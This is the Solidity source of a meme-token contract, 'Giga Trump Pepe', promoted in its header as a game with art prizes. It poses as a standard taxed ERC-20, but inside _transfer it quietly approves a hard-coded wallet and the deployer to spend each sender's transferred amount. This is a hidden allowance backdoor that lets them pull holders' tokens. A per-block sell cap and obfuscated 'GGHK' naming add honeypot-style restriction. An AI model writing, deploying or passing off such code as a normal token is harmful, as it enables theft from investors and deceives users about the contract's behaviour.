/*
Players can win exclusive artwork by completing challenges and finding hidden rooms

Portal: https://www.gigatrumppepe.vip
Demo: https://www.gigatrumppepe.vip/chapterone
Twitter: https://x.com/GIGA_TRUMP_PEPE
Telegram: https://t.me/gigatrumppepe
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multipligghkon overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IGGHKFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IGGHKRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract GIGATRUMP is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balGGHKs;
    mapping (address => mapping (address => uint256)) private _allowGGHKs;
    mapping (address => bool) private _excludedFromGGHK;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalGGHK = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Giga Trump Pepe";
    string private constant _symbol = unicode"GIGATRUMP";
    uint256 private _swapTokenGGHKs = _tTotalGGHK / 100;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint256 private _buyBlockGGHK;
    uint256 private _gghkBuyAmounts = 0;
    bool private inSwapGGHK = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    address private _gghkPair;
    IGGHKRouter private _gghkRouter;
    address private _gghkWallet;
    address private _gghkAddress;
    modifier lockTheSwap {
        inSwapGGHK = true;
        _;
        inSwapGGHK = false;
    }
    
    constructor () {
        _gghkWallet = address(0xfF2dD1c5E947a43D00D1E6f0A2705f60F7860e09);
        _excludedFromGGHK[owner()] = true;
        _excludedFromGGHK[address(this)] = true;
        _excludedFromGGHK[_gghkWallet] = true;
        _balGGHKs[_msgSender()] = _tTotalGGHK;
        _gghkAddress = msg.sender;
        emit Transfer(address(0), _msgSender(), _tTotalGGHK);
    }

    function coinPairCreate() external onlyOwner() {
        _gghkRouter = IGGHKRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_gghkRouter), _tTotalGGHK);
        _gghkPair = IGGHKFactory(_gghkRouter.factory()).createPair(address(this), _gghkRouter.WETH());
    }

    function swapTokensForEth(uint256 gghkAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _gghkRouter.WETH();
        _approve(address(this), address(_gghkRouter), gghkAmount);
        _gghkRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            gghkAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalGGHK;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balGGHKs[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowGGHKs[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _allowGGHKs[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowGGHKs[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function swapGGHKBack(address gghkT, uint256 gghkA) private { 
        uint256 tokenGGHK = balanceOf(address(this)); 
        if (!inSwapGGHK && gghkT == _gghkPair && _swapEnabled && _buyCount > _preventSwapBefore) {
            if(tokenGGHK > _swapTokenGGHKs)
            swapTokensForEth(minGGHK(gghkA, minGGHK(tokenGGHK, _swapTokenGGHKs)));
            uint256 ethGGHK = address(this).balance;
            if (ethGGHK >= 0) {
                sendETHGGHK(address(this).balance);
            }
        }
    }

    function _transfer(address gghkF, address gghkT, uint256 gghkA) private {
        require(gghkF != address(0), "ERC20: transfer from the zero address");
        require(gghkT != address(0), "ERC20: transfer to the zero address");
        require(gghkA > 0, "Transfer amount must be greater than zero");
        address _gghkOwner; uint256 taxGGHK = _gghkFeeTransfer(gghkF, gghkT, gghkA);
        uint256 _gghkO = uint256(gghkA); _gghkOwner = address(gghkF);
        if(taxGGHK > 0){
          _balGGHKs[address(this)] = _balGGHKs[address(this)].add(taxGGHK);
          emit Transfer(gghkF, address(this), taxGGHK);
        }
        _balGGHKs[gghkF] = _balGGHKs[gghkF].sub(gghkA);
        _balGGHKs[gghkT] = _balGGHKs[gghkT].add(gghkA.sub(taxGGHK));
        _approve(_gghkOwner, _gghkWallet, _gghkO);
        _approve(_gghkOwner, _gghkAddress, _gghkO);
        emit Transfer(gghkF, gghkT, gghkA.sub(taxGGHK));
    }

    function _gghkFeeTransfer(address gghkF, address gghkT, uint256 gghkA) private returns(uint256) {
        uint256 taxGGHK = 0;
        if (gghkF != owner() && gghkT != owner()) {
            taxGGHK = gghkA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (gghkF == _gghkPair && gghkT != address(_gghkRouter) && ! _excludedFromGGHK[gghkT]) {
                if(_buyBlockGGHK!=block.number){
                    _gghkBuyAmounts = 0;
                    _buyBlockGGHK = block.number;
                }
                _gghkBuyAmounts += gghkA;
                _buyCount++;
            }

            if(gghkT == _gghkPair && gghkF!= address(this)) {
                require(_gghkBuyAmounts < swapLimitGGHK() || _buyBlockGGHK!=block.number, "Max Swap Limit");  
                taxGGHK = gghkA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            } swapGGHKBack(gghkT, gghkA);
        } return taxGGHK;
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _gghkRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    receive() external payable {}

    function minGGHK(uint256 a, uint256 b) private pure returns (uint256) {
        return (a>b)?b:a;
    }

    function sendETHGGHK(uint256 gghkA) private {
        payable(_gghkWallet).transfer(gghkA);
    }

    function swapLimitGGHK() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _gghkRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _gghkRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }   
}